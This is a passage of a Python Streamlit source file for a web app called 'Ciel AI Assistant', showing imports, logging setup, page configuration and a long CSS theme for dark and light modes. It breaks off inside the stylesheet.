import base64
import hashlib
import html
import io
import json
import logging
import os
import re
import threading
import time
import uuid

import requests
import streamlit as st
from dotenv import load_dotenv
from PIL import Image, ImageOps
from pypdf import PdfReader

from beranda import greeting, has_riset_map, latest_riset, relative_time, templates_for
from chat_sources import answer_parts, count_line, source_buttons_html, source_label, summarize
from chat_store import ChatStore
from login import render_login
from payments import create_snap_transaction, finish_url, new_order_id, order_message, snap_payload
from pricing import PLANS, render_pricing, safe_contact_url
from riset_export import report_docx, report_filename
from writing import APPROACHES, KERANGKA_FOOTNOTE, MAX_OBJECT_CHARS, finish_kerangka, kerangka_payload
from draft_check import MAX_DRAFT_CHARS, MIN_DRAFT_WORDS, check_report, clean_draft, draft_from_file, split_excerpts, word_count
from privacy import render_privacy

# ============================================================
# LOGGING
# ============================================================

logger = logging.getLogger("ciel_ai")

if not logger.handlers:
    handler = logging.StreamHandler()

    formatter = logging.Formatter(
        "%(asctime)s | %(levelname)s | %(name)s | %(message)s"
    )

    handler.setFormatter(formatter)
    logger.addHandler(handler)

logger.setLevel(logging.INFO)
logger.propagate = False

# ============================================================
# PAGE CONFIG
# ============================================================

# Logo "Kepingan": a ring cut flat on the right, with the cut piece (gold)
# slid back out. Sources and PNG renders live in assets/brand.
BRAND_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets", "brand")

st.set_page_config(
    page_title="Ciel AI Assistant",
    page_icon=os.path.join(BRAND_DIR, "ciel-icon-32.png"),
    layout="wide",
    initial_sidebar_state="auto",
)

# ============================================================
# VISUAL SYSTEM
# ============================================================
# Dark first (palette from the "Ciel AI" design artifact): near-black ground,
# warm greys, white pill buttons, a soft blue accent for links, source
# numbers and focus, and highlighter gold for what has no source yet.
# Light mode (LIGHT_TOKENS) keeps the same roles on paper with ink pills; the
# visitor opts in with the toggle (UI_JS sets data-ciel-theme on <html>,
# which React never touches). Dark is the default for everyone else.
# Styling is scoped through container keys (st-key-*) and stable
# data-testid hooks so it survives Streamlit upgrades as far as possible.
# Keep .streamlit/config.toml in step with the dark tokens.

LIGHT_TOKENS = """
    color-scheme: light;
    --c-bg: #f1f1ee;
    --c-surface: #fbfbf9;
    --c-raised: #e6e6e2;
    --c-raised-strong: #dcdcd7;
    --c-line: rgba(22, 21, 19, 0.10);
    --c-line-strong: rgba(22, 21, 19, 0.18);
    --c-control: #86817a;
    --c-text: #161513;
    --c-muted: #4b4a46;
    --c-faint: #5c5b56;
    --c-primary: #161513;
    --c-primary-hover: #2c2a26;
    --c-on-primary: #f1f1ee;
    --c-accent: #2b4886;
    --c-accent-hover: #36579c;
    --c-accent-ink: #ffffff;
    --c-accent-soft: rgba(43, 72, 134, 0.10);
    --c-gold: #e9d06a;
    --c-gold-ink: #3d3209;
    --c-gap-bg: #f5ecc4;
    /* Highlighter gold is ~1.3:1 on paper, too faint for the logo piece. */
    --c-mark-piece: #a07800;
    --c-ok: #2e6a4c;
    --c-warn: #855a00;
    --c-err: #a33b2c;
    --c-shimmer: rgba(255, 255, 255, 0.7);
    --shadow-sm: 0 1px 2px rgba(22, 21, 19, 0.05), 0 1px 1px rgba(22, 21, 19, 0.03);
    --shadow-md: 0 4px 14px rgba(22, 21, 19, 0.06), 0 1px 3px rgba(22, 21, 19, 0.05);
"""

CIEL_CSS = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Geist+Mono:wght@400;500&family=Fraunces:opsz,wght@9..144,400;9..144,500&display=swap');

:root {
    color-scheme: dark;
    --c-bg: #0e0d0c;
    --c-surface: #181715;
    --c-raised: #24231f;
    --c-raised-strong: #2a2926;
    --c-line: rgba(244, 244, 242, 0.09);
    --c-line-strong: rgba(244, 244, 242, 0.16);
    --c-control: #827c72;
    --c-text: #f4f4f2;
    --c-muted: #b4b3ad;
    --c-faint: #959490;
    --c-primary: #f4f4f2;
    --c-primary-hover: #ffffff;
    --c-on-primary: #141311;
    --c-accent: #9db3e8;
    --c-accent-hover: #b4c5ef;
    --c-accent-ink: #141a2a;
    --c-accent-soft: rgba(157, 179, 232, 0.14);
    --c-gold: #e9d06a;
    --c-gold-ink: #2e2606;
    --c-gap-bg: #2b2716;
    --c-mark-piece: #e9d06a;
    --c-ok: #7cc49d;
    --c-warn: #e3b24f;
    --c-err: #f0907f;
    --c-shimmer: rgba(244, 244, 242, 0.06);
    --font-sans: "Geist", ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
    --font-serif: "Fraunces", Georgia, "Times New Roman", serif;
    --font-mono: "Geist Mono", ui-monospace, SFMono-Regular, Menlo, monospace;
    --ease: cubic-bezier(0.32, 0.72, 0, 1);
    --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.30), 0 1px 1px rgba(0, 0, 0, 0.20);
    --shadow-md: 0 4px 14px rgba(0, 0, 0, 0.35), 0 1px 3px rgba(0, 0, 0, 0.25);
    --r-sm: 6px;
    --r-md: 10px;
    --r-lg: 17px;
    --r-pill: 999px;
}
:root[data-ciel-theme="light"] {{{LIGHT_TOKENS}}}

/* ---------- Base ---------- */
.stApp {
    background: var(--c-bg);
    color: var(--c-text);
    font-family: var(--font-sans);
    font-feature-settings: "ss01", "cv11";
}
.stApp, .stApp p, .stApp li, .stApp label, .stApp button, .stApp textarea, .stApp input {
    font-family: var(--font-sans);
}
/* Streamlit puts its theme font (Source Sans) on every markdown container,
   so div/span/strong inside our HTML inherited it. Classes that want the
   serif or mono face set it on the element itself and still win. */
.stApp [data-testid="stMarkdownContainer"] { font-family: var(--font-sans); }
/* Solid so content scrolling under the sticky top bar doesn't show through. */
header[data-testid="stHeader"] { background: var(--c-bg); }

/* Streamlit widgets take their colours from the light theme in config.toml.
   Pointing them at the tokens changes nothing in light mode and makes them
   follow dark mode. Popovers and tooltips render outside .stApp. */
.stApp [data-testid="stCaptionContainer"] { color: var(--c-faint); }
.stApp [data-testid="stPopover"] button { color: var(--c-text); }
header[data-testid="stHeader"] button,
[data-testid="stSidebarCollapseButton"] button,
[data-testid="stExpandSidebarButton"] [data-testid="stIconMaterial"],
[data-testid="stSidebarCollapseButton"] [data-testid="stIconMaterial"] { color: var(--c-muted); }
/* The collapse button only shows while the sidebar is hovered. */
[data-testid="stSidebarCollapseButton"] button:hover,
[data-testid="stExpandSidebarButton"]:hover { background: var(--c-raised); }
[data-testid="stPopoverBody"],
[data-testid="stPopoverBody"] > div { background: var(--c-surface); color: var(--c-text); }
[data-testid="stWidgetLabel"] p { color: var(--c-text); }
[data-testid="stChatMessage"], [data-testid="stChatMessageContent"] { color: var(--c-text); }
[data-testid="stChatInputFileUploadButton"] button { color: var(--c-muted); }
[data-testid="stChatInputFileUploadButton"] button:hover { color: var(--c-text); }
[data-testid="stChatMessageAvatarCustom"],
[data-testid="stChatMessageAvatarCustom"] [data-testid="stIconMaterial"] { background: var(--c-surface); color: var(--c-text); }
/* Ciel's avatar is an image (the app icon), which Streamlit renders as a bare img. */
[data-testid="stChatMessage"] > img { width: 1.5rem; height: 1.5rem; border-radius: var(--r-sm); }
/* Popover content (account menu, "Proyek baru") renders outside .stApp,
   so widget rules below cover both. */
:is(.stApp, [data-testid="stPopoverBody"]) [data-testid="stExpander"] summary { color: var(--c-text); background: transparent; }
:is(.stApp, [data-testid="stPopoverBody"]) [data-testid="stExpander"] summary:hover { background: var(--c-raised); }
/* File uploader (project files) and help icons: Streamlit colours the
   button, the size/type hint and the "?" icon from the light theme. */
[data-testid="stFileUploaderDropzone"] button {
    background: var(--c-surface);
    border: 1px solid var(--c-line-strong);
    color: var(--c-text);
}
[data-testid="stFileUploaderDropzone"] button:hover { background: var(--c-raised); border-color: var(--c-control); }
[data-testid="stFileUploaderDropzone"] button [data-testid="stIconMaterial"] { color: inherit; }
[data-testid="stFileUploaderDropzoneInstructions"] span { color: var(--c-faint); }
[data-testid="stTooltipIcon"] [data-testid="stTooltipHoverTarget"] svg.icon { stroke: var(--c-faint); }
[data-testid="stAlertContentSuccess"] { color: var(--c-ok); }
[data-testid="stAlertContentError"] { color: var(--c-err); }
[data-testid="stAlertContentWarning"] { color: var(--c-warn); }
[data-testid="stAlertContentInfo"] { color: var(--c-text); }
[data-testid="stPopoverBody"] [data-testid="stExpander"] details {
    border: 1px solid var(--c-line);
    border-radius: var(--r-md);
    background: transparent;
}
.stMarkdown code { background: var(--c-raised); color: var(--c-text); }
[data-testid="stHeaderActionElements"] svg { stroke: var(--c-faint); }
[role="tooltip"] > div { background: var(--c-surface); }
[data-testid="stTooltipContent"] { color: var(--c-text); }
[data-baseweb="input"], [data-baseweb="base-input"], [data-baseweb="textarea"],
[data-testid="stTextAreaRootElement"],
[data-testid="stTextInputRootElement"] {
    background: var(--c-raised);
    border-color: var(--c-line-strong);
}
.stApp input, [data-testid="stPopoverBody"] input { color: var(--c-text); caret-color: var(--c-text); }
:is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) [data-testid="InputInstructions"] { color: var(--c-faint); }
.stApp input::placeholder, [data-testid="stPopoverBody"] input::placeholder { color: var(--c-faint); }
#MainMenu, footer { visibility: hidden; }

[data-testid="stMain"] .block-container,
.stMain .block-container {
    max-width: 50rem;
    /* Top padding clears Streamlit's fixed header toolbar (3.75rem). */
    padding: 4rem 1.5rem 9rem;
}

.stApp { overflow-x: hidden; }
.stMarkdown, .stMarkdown p, .stMarkdown li { overflow-wrap: anywhere; }
.stMarkdown p { text-wrap: pretty; }
.stMarkdown pre {
    overflow-x: auto;
    max-width: 100%;
    background: var(--c-surface);
    border: 1px solid var(--c-line);
    border-radius: var(--r-md);
}
.stMarkdown code { font-family: var(--font-mono); font-size: 0.86em; }
.stMarkdown table { display: block; max-width: 100%; overflow-x: auto; }
.stMarkdown img, [data-testid="stImage"] img { max-width: 100%; height: auto; border-radius: var(--r-md); }
[data-testid="stImageCaption"] { font-family: var(--font-mono); font-size: 0.72rem; color: var(--c-faint); }

/* ---------- Focus ---------- */
.stApp :is(button, a, textarea, input, summary, [role="button"]):focus-visible {
    outline: 2px solid var(--c-accent);
    outline-offset: 2px;
}

/* ---------- Top bar ---------- */
/* Sticky on Streamlit's wrapper (the scroll container is section.stMain);
   the bar itself is only as tall as its wrapper and could not stick.
   top matches the header height so the bar sits right under it. */
/* NAV_SCROLL_JS drives --ciel-nav-offset: while scrolling the bar follows
   the scroll pixel for pixel (no transition), and when scrolling stops it
   glides fully in or out. It slides up behind the solid header. */
[data-testid="stLayoutWrapper"]:has(> .st-key-topbar) {
    position: sticky;
    top: 3.75rem;
    z-index: 20;
    transform: translate3d(0, calc(var(--ciel-nav-offset, 0px) * -1), 0);
    transition: transform 0.5s var(--ease);
    will-change: transform;
}
body[data-ciel-nav-moving] [data-testid="stLayoutWrapper"]:has(> .st-key-topbar) { transition: none; }
body[data-ciel-nav="hidden"] [data-testid="stLayoutWrapper"]:has(> .st-key-topbar) { pointer-events: none; }
[data-testid="stLayoutWrapper"]:has(> .st-key-pagejs) { display: none; }
.st-key-topbar {
    background: var(--c-bg);
    padding-bottom: 1rem;
    margin-bottom: 1.6rem;
    border-bottom: 1px solid var(--c-line);
}
.stApp .ciel-crumb { margin: 0; font-size: 0.875rem; color: var(--c-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.ciel-crumb b { font-weight: 500; color: var(--c-text); }
.ciel-wordmark {
    font-family: var(--font-serif);
    font-size: 1.45rem;
    font-weight: 500;
    letter-spacing: -0.02em;
    color: var(--c-text);
}
.ciel-mark { width: 1.2em; height: 1.2em; margin-right: 0.36em; vertical-align: -0.2em; }
.ciel-mark-ring { fill: var(--c-accent); }
.ciel-mark-piece { fill: var(--c-mark-piece); }

/* Theme toggle (THEME_TOGGLE_HTML): sun in dark mode (the default), moon in light mode,
   drawn as a mask so it takes the button's text colour. */
.ciel-theme-toggle {
    --ciel-toggle-icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='4' fill='none' stroke='black' stroke-width='1.8'/%3E%3Cpath d='M12 2.5v2.5M12 19v2.5M2.5 12H5M19 12h2.5M5.3 5.3l1.8 1.8M16.9 16.9l1.8 1.8M5.3 18.7l1.8-1.8M16.9 7.1l1.8-1.8' stroke='black' stroke-width='1.8' stroke-linecap='round'/%3E%3C/svg%3E");
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 2.2rem;
    height: 2.2rem;
    padding: 0;
    border: 0;
    border-radius: 8px;
    background: transparent;
    color: var(--c-muted);
    cursor: pointer;
    transition: color 0.3s var(--ease), background-color 0.3s var(--ease);
}
.ciel-theme-toggle::before {
    content: "";
    width: 18px;
    height: 18px;
    background: currentColor;
    -webkit-mask: var(--ciel-toggle-icon) center / contain no-repeat;
    mask: var(--ciel-toggle-icon) center / contain no-repeat;
}
.ciel-theme-toggle:hover { color: var(--c-text); background: var(--c-raised); }
:root[data-ciel-theme="light"] .ciel-theme-toggle { --ciel-toggle-icon: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M20 14.5A8 8 0 0 1 9.5 4a8 8 0 1 0 10.5 10.5z' fill='none' stroke='black' stroke-width='1.8' stroke-linejoin='round'/%3E%3C/svg%3E"); }

/* Top bar nav, in the style of the claude.ai app: quiet ghost buttons with
   no border and 8px corners, a soft grey background on hover, and Masuk a
   little firmer. Selectors start with .stApp so they outrank the generic
   button rules further down. */
.st-key-topnav { gap: 0.25rem; }
.stApp .st-key-topnav .stButton > button {
    min-height: 2.2rem;
    padding: 0 0.75rem;
    border: 1px solid transparent;
    border-radius: 8px;
    margin-left: 0.25rem;
    background: var(--c-raised);
    color: var(--c-text);
    font-weight: 600;
    transition: background-color 0.2s var(--ease), color 0.2s var(--ease);
}
.stApp .st-key-topnav .stButton > button:hover,
.stApp .st-key-topnav [class*="st-key-navactive_"] button {
    border-color: transparent;
    background: var(--c-raised-strong);
}
/* Account button at the bottom of the sidebar, as in the claude.ai app: it
   stays in view while the history scrolls, and sits at the bottom when the
   sidebar is short. */
[data-testid="stSidebarUserContent"]:has(.st-key-sideaccount) {
    display: flex;
    flex-direction: column;
    min-height: 100%;
    padding-bottom: 0;
}
[data-testid="stSidebarUserContent"]:has(.st-key-sideaccount) > div { flex: 1 0 auto; display: flex; flex-direction: column; }
[data-testid="stSidebarUserContent"]:has(.st-key-sideaccount) > div > [data-testid="stVerticalBlock"] { flex: 1 0 auto; }
[data-testid="stLayoutWrapper"]:has(> .st-key-sideaccount) {
    position: sticky;
    bottom: 0;
    z-index: 1;
    margin-top: auto;
    padding: 0.5rem 0 0.75rem;
    border-top: 1px solid var(--c-line);
    background: var(--c-bg);
}
[data-testid="stSidebar"] .st-key-sideaccount [data-testid="stPopoverButton"] {
    justify-content: flex-start;
    min-height: 2.6rem;
    border-color: transparent;
    border-radius: 8px;
    color: var(--c-text);
}
[data-testid="stSidebar"] .st-key-sideaccount [data-testid="stPopoverButton"]:hover { border-color: transparent; }
/* Label left, Streamlit's chevron pushed to the right edge. */
[data-testid="stSidebar"] .st-key-sideaccount [data-testid="stPopoverButton"] > div { flex: 1; justify-content: space-between; }
[data-testid="stSidebar"] .st-key-sideaccount [data-testid="stPopoverButton"] > div > div:first-child { justify-content: flex-start; }
[data-testid="stSidebar"] .st-key-sideaccount [data-testid="stPopoverButton"] [data-testid="stIconMaterial"] { color: var(--c-muted); }
.ciel-account-email {
    padding: 0 0.6rem;
    font-size: 0.82rem;
    color: var(--c-muted);
    overflow-wrap: anywhere;
}
/* Account menu rows (Pricing, Privasi, Keluar), like a menu list: full
   width, left aligned, a soft grey background on hover and for the current
   page, with lines between the groups. */
[data-testid="stPopoverBody"] .st-key-accountnav {
    gap: 0.1rem;
    padding-bottom: 0.5rem;
    border-bottom: 1px solid var(--c-line);
}
[data-testid="stPopoverBody"] .st-key-accountexit {
    padding-top: 0.5rem;
    border-top: 1px solid var(--c-line);
}
[data-testid="stPopoverBody"] :is(.st-key-accountnav, .st-key-accountexit) [data-testid="stElementContainer"]:has(.stButton),
[data-testid="stPopoverBody"] :is(.st-key-accountnav, .st-key-accountexit) .stButton,
[data-testid="stPopoverBody"] :is(.st-key-accountnav, .st-key-accountexit) .stButton > button { width: 100%; }
[data-testid="stPopoverBody"] :is(.st-key-accountnav, .st-key-accountexit) .stButton > button {
    justify-content: flex-start;
    min-height: 2.2rem;
    padding: 0 0.6rem;
    border: 1px solid transparent;
    border-radius: 8px;
    background: transparent;
    color: var(--c-text);
    font-weight: 500;
}
[data-testid="stPopoverBody"] :is(.st-key-accountnav, .st-key-accountexit) .stButton > button:hover,
[data-testid="stPopoverBody"] .st-key-accountnav [class*="st-key-navactive_"] button {
    border-color: transparent;
    background: var(--c-raised);
    color: var(--c-text);
}
/* Streamlit centres the icon and label in an inner wrapper. */
[data-testid="stPopoverBody"] :is(.st-key-accountnav, .st-key-accountexit) .stButton > button > div { justify-content: flex-start; }
[data-testid="stPopoverBody"] :is(.st-key-accountnav, .st-key-accountexit) [data-testid="stIconMaterial"] { color: var(--c-muted); }
.stApp .st-key-topbar { flex-wrap: nowrap; }
.stApp .st-key-topbar > [data-testid="stElementContainer"]:first-child { flex: 1 1 0; min-width: 0; }


/* ---------- Sidebar ---------- */
[data-testid="stSidebar"] {
    background: var(--c-bg);
    border-right: 1px solid var(--c-line);
}
[data-testid="stSidebarContent"] { padding-top: 1.4rem; }
.ciel-sidehead { margin-bottom: 1.1rem; }
.ciel-sidehead .ciel-wordmark { display: block; }
.ciel-eyebrow {
    margin: 1.4rem 0 0.4rem;
    font-size: 0.78rem;
    color: var(--c-faint);
    font-weight: 500;
    letter-spacing: 0.01em;
}
[data-testid="stSidebar"] [data-testid="stExpander"] {
    border: 1px solid var(--c-line);
    border-radius: var(--r-md);
    background: var(--c-bg);
}
[data-testid="stSidebar"] [data-testid="stExpander"] summary { font-size: 0.86rem; }
.ciel-note { font-size: 0.82rem; line-height: 1.65; color: var(--c-muted); }
.ciel-note p { margin: 0 0 0.6rem; }
.ciel-note b { font-weight: 600; color: var(--c-text); }

/* ---------- Dialog (Riset Skripsi) ---------- */
/* Like popovers, st.dialog renders outside .stApp, so it gets its own
   colour rules; button rules below include [data-testid="stDialog"]. */
[data-testid="stDialog"] [role="dialog"] {
    background: var(--c-surface);
    color: var(--c-text);
    border: 1px solid var(--c-line);
    border-radius: var(--r-lg);
    font-family: var(--font-sans);
}
[data-testid="stDialog"] [role="dialog"] :is(h1, h2, h3, p, label, textarea, input, button) { font-family: var(--font-sans); }
/* The dialog title is a plain <p> that Streamlit colours from the light
   theme; button labels (also <p>) keep their own colour. */
[data-testid="stDialog"] [role="dialog"] [data-testid="stMarkdownContainer"] p:not([class]):not(button p) { color: var(--c-text); }
[data-testid="stDialog"] [role="dialog"] > button[aria-label="Close"] { color: var(--c-muted); }
[data-testid="stDialog"] :is(input, textarea) { color: var(--c-text); caret-color: var(--c-text); }
[data-testid="stDialog"] :is(input, textarea)::placeholder { color: var(--c-faint); }
[data-testid="stDialog"] [data-testid="stCaptionContainer"] { color: var(--c-faint); }
[data-testid="stDialog"] [role="dialog"] [data-testid="stButtonGroup"] button {
    border: 1px solid var(--c-line-strong);
    background: transparent;
    color: var(--c-text);
}
[data-testid="stDialog"] [role="dialog"] [data-testid="stButtonGroup"] button:hover { background: var(--c-raised); }
/* Streamlit 1.54 marks the chosen segment with kind="...Active"; 1.65 (Cloud)
   drops kind and uses aria-checked, falling back to the light primary colour.
   [role="dialog"] outranks 1.65's hover/focus rule for the chosen segment,
   .cls[data-selected]:is([data-hovered], [data-focus-visible]):not([data-disabled]). */
[data-testid="stDialog"] [role="dialog"] [data-testid="stButtonGroup"] button:is([kind$="Active"], [aria-checked="true"]) {
    border-color: var(--c-accent);
    background: var(--c-accent-soft);
    color: var(--c-accent);
}
.ciel-riset-lead { margin: 0 0 1rem; font-size: 0.92rem; line-height: 1.65; color: var(--c-muted); }
.ciel-riset-lead b, .ciel-riset-lock b { font-weight: 600; color: var(--c-text); }
.ciel-riset-lock { margin: 0 0 0.9rem; font-size: 0.92rem; color: var(--c-text); }

/* ---------- Buttons ---------- */
:is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) .stButton > button,
[data-testid="stSidebar"] [data-testid="stPopover"] > button {
    border-radius: var(--r-pill);
    border: 1px solid var(--c-line-strong);
    background: transparent;
    color: var(--c-text);
    font-weight: 500;
    transition: transform 0.4s var(--ease), background-color 0.4s var(--ease), border-color 0.4s var(--ease);
}
:is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) .stButton > button:hover,
[data-testid="stSidebar"] [data-testid="stPopover"] > button:hover {
    background: var(--c-raised);
    border-color: var(--c-faint);
}
[data-testid="stSidebar"] [data-testid="stPopover"] button { background: transparent; }
[data-testid="stSidebar"] [data-testid="stPopover"] button:hover { background: var(--c-raised); }
:is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) .stButton > button:active { transform: translateY(1px); }
:is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) .stButton > button[kind="primary"] {
    background: var(--c-primary);
    border-color: var(--c-primary);
    color: var(--c-on-primary);
    border-radius: var(--r-pill);
    font-weight: 600;
}
:is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) .stButton > button[kind="primary"]:hover { background: var(--c-primary-hover); border-color: var(--c-primary-hover); color: var(--c-on-primary); }
:is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) .stButton > button[kind="primary"] :is(p, [data-testid="stIconMaterial"]) { color: inherit; }
/* Download buttons ("Unduh DOCX", "Unduh CSV") sit in .stDownloadButton,
   not .stButton, and kept Streamlit's light colours in dark mode. */
:is(.stApp, [data-testid="stPopoverBody"]) .stDownloadButton > button {
    border-radius: var(--r-pill);
    border: 1px solid var(--c-line-strong);
    background: transparent;
    color: var(--c-text);
    font-weight: 500;
}
:is(.stApp, [data-testid="stPopoverBody"]) .stDownloadButton > button:hover {
    background: var(--c-raised);
    border-color: var(--c-faint);
    color: var(--c-text);
}
:is(.stApp, [data-testid="stPopoverBody"]) .stDownloadButton > button :is(p, [data-testid="stIconMaterial"]) { color: inherit; }
/* Links in answers (sources, DOI): Streamlit used the light theme's navy,
   about 3:1 on dark paper. */
.stApp [data-testid="stMarkdownContainer"] a { color: var(--c-accent); }
.stApp [data-testid="stMarkdownContainer"] a:hover { color: var(--c-accent-hover); }
/* Link buttons ("Bayar di Midtrans" on Pricing) are <a>, not <button>, so
   the rules above do not reach them. */
.stApp [data-testid="stBaseLinkButton-primary"] {
    border-radius: var(--r-pill);
    border: 1px solid var(--c-primary);
    background: var(--c-primary);
    color: var(--c-on-primary);
    font-weight: 600;
}
.stApp [data-testid="stBaseLinkButton-primary"]:hover { background: var(--c-primary-hover); border-color: var(--c-primary-hover); color: var(--c-on-primary); }
.stApp [data-testid="stBaseLinkButton-primary"] :is(p, span, [data-testid="stIconMaterial"]) { color: inherit; }
/* Disabled buttons (e.g. "Hapus semua memoriku" until its checkbox is
   ticked) look muted and stay the same on hover; otherwise the hover
   background met Streamlit's light-theme disabled text and hid the label. */
:is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) .stButton > button:disabled,
:is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) .stButton > button:disabled:hover {
    background: transparent;
    border-color: var(--c-line);
    color: var(--c-faint);
    cursor: not-allowed;
    transform: none;
}
:is(.stApp, [data-testid="stPopoverBody"], [data-testid="stDialog"]) .stButton > button:disabled :is(p, [data-testid="stIconMaterial"]) { color: inherit; }
.stButton:is([class*="st-key-delchat_"], [class*="st-key-delproj_"]) > button:not(:disabled):hover {
    color: var(--c-err);
    border-color: rgba(163, 59, 44, 0.4);
    background: transparent;
}

/* ---------- Beranda ---------- */
/* Replaces the empty chat page: greeting, the composer itself (inline),
   template buttons, then two quiet panels. */
.st-key-beranda { max-width: 41.25rem; margin: 2.5rem auto 0; gap: 1.1rem; }
.ciel-home-head { text-align: center; }
.stApp .ciel-home-head h1 {
    margin: 0;
    padding: 0;
    font-family: var(--font-serif);
    font-size: 2rem;
    font-weight: 500;
    line-height: 1.2;
    letter-spacing: -0.02em;
    color: var(--c-text);
}
.stApp .ciel-home-head p { margin: 0.4rem 0 0; font-size: 0.875rem; color: var(--c-muted); }
.st-key-beranda [data-testid="stChatInput"] { margin: 0.4rem 6px 0.3rem; }
.st-key-templates { justify-content: center; flex-wrap: wrap; gap: 0.5rem; }
.st-key-templates .stButton > button {
    min-height: 2.25rem;
    padding: 0 0.95rem;
    border: 0;
    background: var(--c-surface);
    box-shadow: inset 0 0 0 1px var(--c-line);
    color: var(--c-text);
}
.st-key-templates .stButton > button:hover { background: var(--c-raised-strong); }
.st-key-homepanels { gap: 0.6rem; align-items: stretch; margin-top: 0.8rem; }
:is(.st-key-home_recent, .st-key-home_memory) {
    flex: 1 1 0;
    min-width: 0;
    gap: 0.4rem;
    padding: 0.9rem;
    border-radius: var(--r-lg);
    background: var(--c-surface);
    box-shadow: inset 0 0 0 1px var(--c-line);
}
.stApp .ciel-home-h { margin: 0 0 0.35rem; font-size: 0.875rem; font-weight: 600; line-height: 1.4; color: var(--c-text); }
:is(.st-key-home_recent, .st-key-home_memory) [data-testid="stMarkdownContainer"] { margin-bottom: 0; }
.st-key-home_recent .stButton > button {
    width: 100%;
    height: auto;
    padding: 0.6rem 0.9rem;
    justify-content: flex-start;
    text-align: left;
    border: 0;
    border-radius: var(--r-md);
    background: var(--c-raised);
    color: var(--c-text);
    font-weight: 500;
}
.st-key-home_recent .stButton > button:hover { background: var(--c-raised-strong); }
/* Whole sentences: long titles wrap instead of being cut. */
.st-key-home_recent .stButton > button p { white-space: normal; overflow-wrap: anywhere; text-align: left; line-height: 1.45; }
/* Streamlit centres the label in an inner wrapper; short titles drifted to the middle. */
.st-key-home_recent .stButton > button > div { justify-content: flex-start; min-width: 0; }
.ciel-home-row {
    display: flex;
    align-items: flex-start;
    justify-content: space-between;
    gap: 0.6rem;
    padding: 0.6rem 0.75rem;
    border-radius: var(--r-md);
    background: var(--c-raised);
    font-size: 0.875rem;
    color: var(--c-text);
}
.ciel-home-row span { white-space: normal; overflow-wrap: anywhere; line-height: 1.45; }
.ciel-home-row em { font-style: normal; font-size: 0.75rem; color: var(--c-faint); white-space: nowrap; }
/* Long memories: whole sentences first, the rest one click away. */
details.ciel-home-more { display: block; }
.ciel-home-more summary { cursor: pointer; list-style: none; line-height: 1.45; overflow-wrap: anywhere; }
.ciel-home-more summary::-webkit-details-marker { display: none; }
.ciel-home-more summary b { font-weight: 500; color: var(--c-accent); white-space: nowrap; }
.ciel-home-more[open] summary b { display: none; }
.ciel-home-more > span { display: block; margin-top: 0.4rem; }
.ciel-home-less {
    padding: 0;
    border: 0;
    background: none;
    font: inherit;
    font-weight: 500;
    color: var(--c-accent);
    white-space: nowrap;
    cursor: pointer;
}
.ciel-home-less:focus-visible { outline: 2px solid var(--c-accent); outline-offset: 2px; border-radius: 2px; }
@media (max-width: 640px) {
    .st-key-beranda { margin-top: 1rem; }
    .st-key-homepanels { flex-direction: column; }
}

/* ---------- Messages ---------- */
[data-testid="stChatMessage"] {
    background: transparent;
    padding: 0.9rem 0;
    gap: 0.9rem;
    animation: ciel-rise 0.6s var(--ease) both;
}
[data-testid="stChatMessage"] [data-testid="stMarkdownContainer"] {
    font-size: 0.9375rem;
    line-height: 1.6;
    max-width: 66ch;
}
/* Headings inside answers (the Riset Skripsi source map starts with "#").
   Streamlit's defaults are 44/36 px in its own font; these follow the
   hero (serif title) and keep sections readable in a chat column. */
[data-testid="stChatMessage"] [data-testid="stMarkdownContainer"] :is(h1, h2, h3) {
    padding: 0;
    color: var(--c-text);
    text-wrap: balance;
}
[data-testid="stChatMessage"] [data-testid="stMarkdownContainer"] h1 {
    margin: 0.1rem 0 0.8rem;
    font-family: var(--font-serif);
    font-size: 1.6rem;
    font-weight: 500;
    line-height: 1.2;
    letter-spacing: -0.015em;
}
[data-testid="stChatMessage"] [data-testid="stMarkdownContainer"] h2 {
    margin: 1.5rem 0 0.5rem;
    font-family: var(--font-sans);
    font-size: 1.1rem;
    font-weight: 600;
    line-height: 1.35;
    letter-spacing: -0.01em;
}
[data-testid="stChatMessage"] [data-testid="stMarkdownContainer"] h3 {
    margin: 1.2rem 0 0.4rem;
    font-family: var(--font-sans);
    font-size: 1rem;
    font-weight: 600;
}
/* The user avatar is a material icon (stChatMessageAvatarCustom), so the
   message is found by its content's aria-label. */
[data-testid="stChatMessage"]:has(> [aria-label="Chat message from user"]) {
    width: fit-content;
    max-width: 80%;
    margin-left: auto;
    background: var(--c-surface);
    border: 0;
    border-radius: 16px;
    padding: 0.7rem 1rem;
    margin-top: 0.6rem;
    margin-bottom: 0.6rem;
}
[data-testid="stChatMessage"]:has(> [aria-label="Chat message from user"]) > :first-child { display: none; }
[data-testid="stChatMessageAvatarUser"],
[data-testid="stChatMessageAvatarAssistant"] {
    border-radius: var(--r-sm);
    width: 1.9rem; height: 1.9rem;
    font-family: var(--font-mono);
    font-weight: 500;
}
[data-testid="stChatMessageAvatarUser"] { background: var(--c-raised); color: var(--c-muted); }
[data-testid="stChatMessageAvatarAssistant"] { background: var(--c-accent); color: var(--c-accent-ink); }

/* ---------- Chat page: header, sources, rail ---------- */
.stApp .ciel-chathead { padding: 0 0 0.9rem; margin-bottom: 0.4rem; border-bottom: 1px solid var(--c-line); }
.stApp .ciel-chathead h1 { margin: 0; padding: 0; font-family: var(--font-sans); font-size: 1.125rem; font-weight: 600; line-height: 1.4; color: var(--c-text); }
.stApp .ciel-chathead p { margin: 0.2rem 0 0; font-size: 0.875rem; color: var(--c-muted); }
